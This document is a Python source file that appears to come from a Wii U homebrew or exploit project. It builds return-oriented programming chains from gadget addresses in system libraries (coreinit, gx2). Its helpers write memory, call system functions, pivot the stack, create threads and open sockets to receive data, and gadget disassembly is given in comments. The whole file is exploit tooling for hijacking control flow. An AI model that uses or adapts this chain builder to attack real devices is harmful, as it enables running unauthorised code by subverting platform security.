from ropgadget_addr import *


def setr3r4(r3, r4):
    if 'ROP_GX2_r3r4load' not in globals():
        raise ValueError('rop gagdet ROP_R3_TO_R7 is missing')
    return [ROP_GX2_r3r4load,
            r3,
            r4,
            0x0]


def pop_r24_to_r31(inputregs):
    if 'ROP_POP_R24_TO_R31' not in globals():
        raise ValueError('rop gagdet ROP_POP_R24_TO_R31 is missing')
    curchain = [
        ROP_POP_R24_TO_R31,
        0,
        0]

    for i in range(0, 8):
        curchain.append(inputregs[i])

    curchain.append(0)
    return curchain


def call_func(funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):
    if 'ROP_CALLR28_POP_R28_TO_R31' not in globals():
        raise ValueError('rop gagdet ROP_CALLR28_POP_R28_TO_R31 is missing')
    curchain = []
    input_regs = [r6,
                  r5,
                  0,
                  ROP_CALLR28_POP_R28_TO_R31,
                  funcaddr,
                  r3,
                  0,
                  r4]

    curchain += pop_r24_to_r31(input_regs)

    curchain.append(ROP_CALLFUNC)
    curchain.append(r28)
    curchain.append(0)
    curchain.append(0)
    curchain.append(0)
    curchain.append(0)
    return curchain


def tiny_call(fptr, r3=0, r4=0):
    if 'ROP_POP_R28R29R30R31' not in globals():
        raise ValueError('rop gagdet ROP_POP_R28R29R30R31 is missing')
    if 'ROP_CALLR28_POP_R28_TO_R31' not in globals():
        raise ValueError('rop gagdet ROP_CALLR28_POP_R28_TO_R31 is missing')
    curchain = []
    curchain += setr3r4(r3, r4)
    curchain.append(ROP_POP_R28R29R30R31)
    curchain.append(fptr)
    curchain.append(0)
    curchain.append(0)
    curchain.append(r4)
    curchain.append(0)
    curchain.append(ROP_CALLR28_POP_R28_TO_R31)
    curchain.append(0)
    curchain.append(0)
    curchain.append(0)
    curchain.append(0)
    curchain.append(0)
    return curchain


def write_r3r4_tomem(outaddr):
    if 'ROP_POP_R28R29R30R31' not in globals():
        raise ValueError('rop gagdet ROP_POP_R28R29R30R31 is missing')
    if 'ROP_OSGetCodegenVirtAddrRange' not in globals():
        raise ValueError('rop gagdet ROP_OSGetCodegenVirtAddrRange is missing')
    if 'ROP_CALLR28_POP_R28_TO_R31' not in globals():
        raise ValueError('rop gagdet ROP_CALLR28_POP_R28_TO_R31 is missing')
    return [ROP_POP_R28R29R30R31,
            ROP_OSGetCodegenVirtAddrRange + 0x20,
            0,
            outaddr,
            0x10000000,
            0,
            ROP_CALLR28_POP_R28_TO_R31,
            0,
            0,
            0]


def write32(addr, value):
    cur_chain = []
    cur_chain += setr3r4(value, 0)
    cur_chain += write_r3r4_tomem(addr)
    return cur_chain


def call_with_dereferenced_r3(addr, arg1_ptr, arg2=0, arg3=0, arg4=0, arg5=0):
    cur_chain = []
    # set r3 to arg5
    cur_chain += setr3r4(arg5, 0)
    # move it to r7

    if 'ROP_R3_TO_R7' in globals():
        cur_chain.append(ROP_R3_TO_R7)  # 0x028036ec: mr r7, r3; lwz r0, 0xc(r1) ; mtlr r0; addi r1, r1, 8; mr r3, r7; blr;
        cur_chain.append(0x0000DEA2)  # ;r1 +8
    else:
        raise ValueError('rop gagdet ROP_R3_TO_R7 is missing')

    # set r3 to arg3
    cur_chain += setr3r4(arg4, 0)

    if 'ROP_R3_TO_R11' and 'ROP_R11_TO_R6' in globals():
        # move it to r11
        cur_chain.append(ROP_R3_TO_R11)  # 0x029002ac: mr r11, r3; lwz r0, 0xc(r1) ; mtlr r0; addi r1, r1, 8; mr r3, r11; blr;
        cur_chain.append(0x0000DEA6)  # ;r1 + 8
        # then we can move it to r6
        cur_chain.append(ROP_R11_TO_R6)  # 0x029dd8fc: mr r6, r11; lwz r0, 0x14(r1) ; mtlr r0; addi r1, r1, 0x10; clrlwi r3, r6, 0x18; blr;
        cur_chain.append(0x0000DEA7)  # ;r1 + 8
        cur_chain.append(0x0000DEA8)  # ;r1 + 0xC
        cur_chain.append(0x0000DEA9)  # ;r1 + 0x10
    elif 'ROP_R3_TO_R6' in globals():
        print('yay')
    else:
        raise ValueError('rop gagdet is missing')

        # set arg3 to r3
    cur_chain += setr3r4(arg3, 0)
    if 'ROP_R3_TO_R5' in globals():
        # move it to r5
        cur_chain.append(ROP_R3_TO_R5)  # 0x0211cb44 mr r5, r3; lwz r0, 0x14(r1) ; mtlr r0; addi r1, r1, 0x10; mr r3, r5; blr;
        cur_chain.append(0x0000DEAA)  # ;r1 + 8
        cur_chain.append(0x0000DEAB)  # ;r1 + 0xC
        cur_chain.append(0x0000DEAC)  # ;r1 + 0x10
    elif 'ROP_R3_TO_R5_POP_R29_R30_R31' in globals():
        cur_chain.append(ROP_R3_TO_R5_POP_R29_R30_R31)  # 0x3a21bc4: mr r5, r3; lwz r29, 0x34(r1); lwz r0, 0x44(r1); lwz r30, 0x38(r1); mtlr r0; lwz r31, 0x3c(r1); addi r1, r1, 0x40; addi r3, r5, 0x10; blr
        cur_chain.append(0x0000DEAA)  # ;r1 + 0x08
        cur_chain.append(0x0000DEAB)  # ;r1 + 0x0C
        cur_chain.append(0x0000DEAC)  # ;r1 + 0x10
        cur_chain.append(0x0000DEAD)  # ;r1 + 0x14
        cur_chain.append(0x0000DEAE)  # ;r1 + 0x18
        cur_chain.append(0x0000DEAF)  # ;r1 + 0x1C
        cur_chain.append(0x0000DEB0)  # ;r1 + 0x20
        cur_chain.append(0x0000DEB1)  # ;r1 + 0x24
        cur_chain.append(0x0000DEB2)  # ;r1 + 0x28
        cur_chain.append(0x0000DEB3)  # ;r1 + 0x2C
        cur_chain.append(0x0000DEB4)  # ;r1 + 0x30
        cur_chain.append(0x0000DEB5)  # ;r1 + 0x34 // r29
        cur_chain.append(0x0000DEB6)  # ;r1 + 0x38 // r30
        cur_chain.append(0x0000DEB7)  # ;r1 + 0x3C // r31
        cur_chain.append(0x0000DEB8)  # ;r1 + 0x40
    else:
        raise ValueError('rop gagdet is missing')

    cur_chain += call_with_dereferenced_r3_tiny(addr, arg1_ptr, arg2)
    return cur_chain


def call_with_dereferenced_r3_tiny(addr, arg1_ptr, arg2=0):
    cur_chain = []
    # now we can set r3
    cur_chain += setr3r4(arg1_ptr, 0)

    if 'ROP_lwz_r3_0_r3__lwz_r0_0xc_r1__mtlr_r0__addi_r1_r1_8__blr' not in globals():
        raise ValueError('rop gagdet ROP_lwz_r3_0_r3__lwz_r0_0xc_r1__mtlr_r0__addi_r1_r1_8__blr is missing')

    cur_chain.append(ROP_lwz_r3_0_r3__lwz_r0_0xc_r1__mtlr_r0__addi_r1_r1_8__blr)  # #0x2024858 r3 = *r3 # lwz r3, 0(r3); lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; blr;
    cur_chain.append(0x0)  # + 8

    if 'ROP_POP_R28R29R30R31' not in globals():
        raise ValueError('rop gagdet ROP_POP_R28R29R30R31 is missing')

    # set func address to r28, arg2 to r31
    cur_chain.append(ROP_POP_R28R29R30R31)  # coreinit.rpl 0x020014d4: lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r30, 0x10(r1); mtlr r0; lwz r31, 0x14(r1); addi r1, r1, 0x18; blr;
    cur_chain.append(addr)  # r28 + 8
    cur_chain.append(0)  # r29 +0x0C
    cur_chain.append(0)  # r30+ 0x10
    cur_chain.append(arg2)  # r31 + 0x14
    cur_chain.append(0)  # + 0x18

    if 'ROP_CALLR28_POP_R28_TO_R31' not in globals():
        raise ValueError('rop gagdet ROP_CALLR28_POP_R28_TO_R31 is missing')

    # r31 will be moved to r4
    cur_chain.append(ROP_CALLR28_POP_R28_TO_R31)  # coreinit: 0x02061970: mtctr r28; mr r4, r31; bctrl; lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r31, 0x14(r1); mtlr r0; lwz r30, 0x10(r1); addi r1, r1, 0x18; blr;
    cur_chain.append(0)  # r28 + 8
    cur_chain.append(0)  # r29 + 0xC
    cur_chain.append(0)  # r30 + 0x10
    cur_chain.append(0)  # r31 + 0x14
    cur_chain.append(0)  # + 0x18
    return cur_chain


def call_ptr(addr_ptr, arg1=0, arg2=0):
    if 'ROP_POP_R12' not in globals():
        raise ValueError('rop gagdet ROP_POP_R12 is missing')
    # overrides r3
    # 0x025850c0: lwz r12, 8(r1); addis r3, r12, 0x8000; lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
    cur_chain = [ROP_POP_R12,
                 addr_ptr - 0x2C,
                 0x0000DEA3,
                 0x0000DEA4]

    # sets r3 and r4. More arguments could be set using the gadget (call_with_dereferenced_r3)
    cur_chain += setr3r4(arg1, arg2)

    if 'ROP_GX2_call_r12' not in globals():
        raise ValueError('rop gagdet ROP_GX2_call_r12 is missing')
    cur_chain.append(ROP_GX2_call_r12)  # gx2.rpl; 0x0203b19c: lwz r0, 0x2c(r12); mtctr r0; bctrl; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; blr;
    cur_chain.append(0)  # 8

    return cur_chain


def DCFlushRange(addr, size):
    if 'ROP_DCFlushRange' not in globals():
        raise ValueError('rop gagdet ROP_DCFlushRange is missing')
    return tiny_call(ROP_DCFlushRange, addr, size)


def ICInvalidateRange(addr, size):
    if 'ROP_ICInvalidateRange' not in globals():
        raise ValueError('rop gagdet ROP_ICInvalidateRange is missing')
    return tiny_call(ROP_ICInvalidateRange, addr, size)


def memcpy(dest, src, size):
    if 'ROP_memcpy' not in globals():
        raise ValueError('rop gagdet ROP_memcpy is missing')
    return call_func(ROP_memcpy, dest, src, size)


def OSDriver_Register(name, name_len, unkwn1, unkwn2):
    if 'ROP_Register' not in globals():
        raise ValueError('rop gagdet ROP_Register is missing')
    return call_func(ROP_Register, name, name_len, unkwn1, unkwn2)


def OSDriver_CopyToSaveArea(name, name_len, data, data_len):
    if 'ROP_CopyToSaveArea' not in globals():
        raise ValueError('rop gagdet ROP_CopyToSaveArea is missing')
    return call_func(ROP_CopyToSaveArea, name, name_len, data, data_len)


def OSResumeThread(thread):
    if 'ROP_OSResumeThread' not in globals():
        raise ValueError('rop gagdet ROP_OSResumeThread is missing')
    return tiny_call(ROP_OSResumeThread, thread)


def OSFatal(arg):
    if 'ROP_OSFatal' not in globals():
        raise ValueError('rop gagdet ROP_OSFatal is missing')
    return tiny_call(ROP_OSFatal, arg)


def OSSuspendThread(thread):
    if 'ROP_OSSuspendThread' not in globals():
        raise ValueError('rop gagdet ROP_OSSuspendThread is missing')
    return tiny_call(ROP_OSSuspendThread, thread)


def OSDynLoad_Acquire(name_ptr, handle_ptr):
    if 'ROP_OSDynLoad_Acquire' not in globals():
        raise ValueError('rop gagdet ROP_OSDynLoad_Acquire is missing')
    return tiny_call(ROP_OSDynLoad_Acquire, name_ptr, handle_ptr)


def OSExitThread(resultcode):
    if 'ROP_OSExitThread' not in globals():
        raise ValueError('rop gagdet ROP_OSExitThread is missing')
    return tiny_call(ROP_OSExitThread, resultcode)


def socket(domain, type, protocol):
    if 'ROP_socket' not in globals():
        raise ValueError('rop gagdet ROP_socket is missing')
    return call_func(ROP_socket, domain, type, protocol)


def connect(sockfd, addr, addrlen):
    if 'ROP_connect' not in globals():
        raise ValueError('rop gagdet ROP_connect is missing')
    return call_func(ROP_connect, sockfd, addr, addrlen)


def recv(sockfd, buf, len, flags):
    if 'ROP_recv' not in globals():
        raise ValueError('rop gagdet ROP_recv is missing')
    return call_func(ROP_recv, sockfd, buf, len, flags)


def GX2WaitForVsync():
    if 'ROP_GX2WaitForVsync' not in globals():
        raise ValueError('rop gagdet ROP_GX2WaitForVsync is missing')
    return tiny_call(ROP_GX2WaitForVsync)


def GX2Flush():
    if 'ROP_GX2Flush' not in globals():
        raise ValueError('rop gagdet ROP_GX2Flush is missing')
    return tiny_call(ROP_GX2Flush)


def GX2DrawDone():
    if 'ROP_GX2DrawDone' not in globals():
        raise ValueError('rop gagdet ROP_GX2DrawDone is missing')
    return tiny_call(ROP_GX2DrawDone)


def GX2DirectCallDisplayList(addr, size):
    if 'ROP_GX2DirectCallDisplayList' not in globals():
        raise ValueError('rop gagdet ROP_GX2DirectCallDisplayList is missing')
    return tiny_call(ROP_GX2DirectCallDisplayList, addr, size)


def FindExportAndCall(tmp, rpl_name_addr, function_name_addr, arg1=0, arg2=0):
    if 'ROP_OSDynLoad_FindExport' not in globals():
        raise ValueError('rop gagdet ROP_OSDynLoad_FindExport is missing')
    cur_chain = []
    cur_chain += OSDynLoad_Acquire(rpl_name_addr, tmp)
    cur_chain += call_with_dereferenced_r3(ROP_OSDynLoad_FindExport, tmp, 0, function_name_addr, tmp + 0x04, 0)  # will use the value of (tmp) in r3, not the address!
    cur_chain += call_ptr(tmp + 0x04, arg1, arg2)
    return cur_chain


def StackPivot(new_stack):
    cur_chain = []
    # set r3 to arg3
    cur_chain += setr3r4(new_stack, 0)

    if 'ROP_R3_TO_R11' not in globals():
        raise ValueError('rop gagdet ROP_R3_TO_R11 is missing')
    if 'ROP_R11_TO_R1' not in globals():
        raise ValueError('rop gagdet ROP_R11_TO_R1 is missing')

    # move it to r11
    cur_chain.append(ROP_R3_TO_R11)  # 0x029002ac: mr r11, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r11; blr;
    cur_chain.append(0x0000DEA6)  # ;r1 + 8
    cur_chain.append(ROP_R11_TO_R1)  # 0x02a645b0 ;r1 + 12 # lwz r0, 4(r11); mtlr r0; mr r1, r11; blr;
    return cur_chain


def OSCreateThread(thread, entry, argc, argv, stack, stackSize, priority, attributes):
    curchain = [];
    inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
    inputregs[24 - 24] = 0  # #r24
    inputregs[25 - 24] = stack  # #r25 # r7
    inputregs[26 - 24] = stackSize  # #r26 # r8
    inputregs[27 - 24] = priority  # #r27 # r9
    inputregs[28 - 24] = thread  # #r28 #r3
    inputregs[29 - 24] = entry  # #r29 #r4
    inputregs[30 - 24] = argc  ##r30 #r5
    inputregs[31 - 24] = argv  # #r31 # r6
    curchain += pop_r24_to_r31(inputregs)

    if 'ROP_CreateThreadInternal' not in globals():
        raise ValueError('rop gagdet ROP_CreateThreadInternal is missing')

    # 0x020257a8: li r0, 2; lhz r10, 0xc(r1); mr r3, r28; mr r8, r26; stw r0, 8(r1); mr r4, r29; mr r5, r30; mr r6, r31;
    # mr r7, r25; mr r9, r27; bl 0x2025548; lmw r25, 0x14(r1); lwz r0, 0x34(r1);mtlr r0; addi r1, r1, 0x30; blr;
    curchain.append(ROP_CreateThreadInternal)
    curchain.append(2)  # param #10 ;r1 +8
    curchain.append(attributes << 16)  # r10 ;r1 +12 (lhz from this register)
    curchain.append(0)  # ;r1 +16
    curchain.append(0)  # r25 ;r1 +20
    curchain.append(0)  # r26 ;r1 +24
    curchain.append(0)  # r27 ;r1 +28
    curchain.append(0)  # r28 ;r1 +32
    curchain.append(0)  # r29 ;r1 +36
    curchain.append(0)  # r30 ;r1 +40
    curchain.append(0)  # r31 ;r1 +44 (0x2C)
    curchain.append(0)
    return curchain
